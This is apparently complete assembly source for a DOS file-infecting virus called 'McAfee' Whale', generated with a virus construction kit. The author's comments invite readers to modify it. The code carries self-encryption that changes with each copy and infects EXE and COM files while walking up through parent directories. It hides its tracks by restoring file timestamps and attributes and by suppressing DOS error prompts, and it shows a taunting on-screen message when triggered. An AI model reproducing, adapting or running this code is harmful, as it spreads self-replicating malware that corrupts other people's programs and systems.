; McWhale.asm : [McAfee' Whale] by [pAgE]
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg
;
; Here's another "lame dick" virus! I thought it was rather fitting!
; Many thanks to the fellows at Phalcon/Skism for this little tool.
; I am sure that Dark Angel and the bunch are not stopping here, but
; will come up with another innovation in Vx production...
;
; I have set this file to activate at a 40% chance on any day. Feel free
; to modify this program as you see fit or keep it as a novelty in its
; original form.


.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'MO'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:                                ; handles encryption and decryption
          mov  bx,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  si,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,04h              ; add word ptr cs:[si], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  si                       ; calculate new decryption location
          inc  si
          dec  bx                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],2 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
          mov  ah,2ah                   ; Get current date
          int  21h                      ;
         ;cmp  dh,4                     ; Check month
         ;jb   exit_virus               ;
         ;cmp  dl,15                    ; Check date
         ;jnz  exit_virus               ;

         ;mov  ah,2ch                   ; Get current time
         ;int  21h
          cmp  dl,40                    ; Check the percentage
          jbe  activate

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  21h
          retn                          ; 100h is on stack
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
stacksave2          dd ?

activate        proc    far

start:
		jmp	loc_1
data_1		db	0
data_2		dw	0
		db	 62h, 79h
                db      ' ABRAXAS - '
copyright       db      '(c) 1992 Abraxas Warez.'
                db      '.....................................BEWARE!!!............'
                db      '....................'
data_5          db      'Anti-Virus.....Man.....John.....McAfee.....wrote'
                db      '.....the.....WHALE.....virus!!!'
                db      '..............................HONEST!!!....................................$'
loc_1:
		push	si
		push	di
		mov	si,80h
		cld				; Clear direction
		call	sub_1
		cmp	byte ptr [si],0Dh
		je	loc_4			; Jump if equal
		mov	cx,28h
		lea	di,data_5		; ('Attention: Please press ') Load ef
locloop_2:
		lodsb				; String [si] to al
		cmp	al,0Dh
		je	loc_3			; Jump if equal
		stosb				; Store al to es:[di]
		loop	locloop_2		; Loop if cx > 0
loc_3:
		inc	cx
		mov	al,2Eh			; '.'
		rep	stosb			; Rep when cx >0 Store al to es:[di]
loc_4:
		pop	di
		pop	si
		mov	ah,3
		mov	bh,0
		int	10h			; Video display   ah=functn 03h
						;  get cursor loc in dx, mode cx

                mov     data_2,cx
		mov	ah,1
		mov	cx,0F00h
		int	10h			; Video display   ah=functn 01h
						;  set cursor mode in cx
		mov	ah,2
		mov	dh,18h
		mov	dl,13h
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
loc_5:
		mov	data_1,0FFh
loc_6:
		add	data_1,1
		mov	bl,data_1
		mov	bh,0
		mov	cx,27h
		call	sub_2

locloop_7:
		mov	al,byte ptr copyright+20h[bx]	; ('.')
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		inc	bx
		call	sub_3
		mov	dl,0FFh
		mov	ah,6
		int	21h			; DOS Services  ah=function 06h
						;  special char i/o, dl=subfunc
		jnz	loc_10			; Jump if not zero
		loop	locloop_7		; Loop if cx > 0

		cmp	byte ptr copyright+20h[bx],24h	; ('.') '$'
		je	loc_5			; Jump if equal
		jmp	short loc_6

activate        endp

sub_1		proc	near
loc_8:
		inc	si
		cmp	byte ptr [si],20h	; ' '
		je	loc_8			; Jump if equal
                retn
sub_1		endp

sub_2		proc	near
                push    ax
                push    bx
                push    cx
                push    dx
                mov     dx,si
                mov     cx,di
                mov     al,4
                mov     ah,0ch
                int     10h
                mov     ah,2
                mov     dh,8h
                mov     dl,14h
                mov     cx,30
                int     10h                     ; Video display   ah=functn 02h
                mov     ah,10h
                mov     al,0
                mov     bl,4
                mov     bh,63
                int     10h
                pop     dx
                pop     cx
                pop     bx
                pop     ax

                retn
sub_2		endp

sub_3		proc	near
		push	cx
		mov	cx,258h
locloop_9:
		loop	locloop_9		; Loop if cx > 0
		pop	cx
		retn
sub_3		endp

loc_10:
		call	sub_2
		mov	cx,4Fh
locloop_11:
		mov	al,20h			; ' '
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		loop	locloop_11		; Loop if cx > 0

		mov	ah,1
		mov	cx,data_2
		int	10h			; Video display   ah=functn 01h
		int	20h			; DOS program terminate
          jmp  exit_virus

creator             db '[MPC]',0                ; BIG SIGN!!!
virusname           db "[McAfee' Whale]",0      ; That's it!!
author              db '[pAgE]',0               ; Nah! Not me!<g>

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+35] ; Get tail of filename
          cmp  ax,'DN'                  ; Ends in ND? (commaND)
          jz   find_next

          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax, heap-decrypt         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          xor  byte ptr [bp+decrypt_loop+2],028h ; flip between add/sub

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

exe_mask            db '*.exe',0
com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point
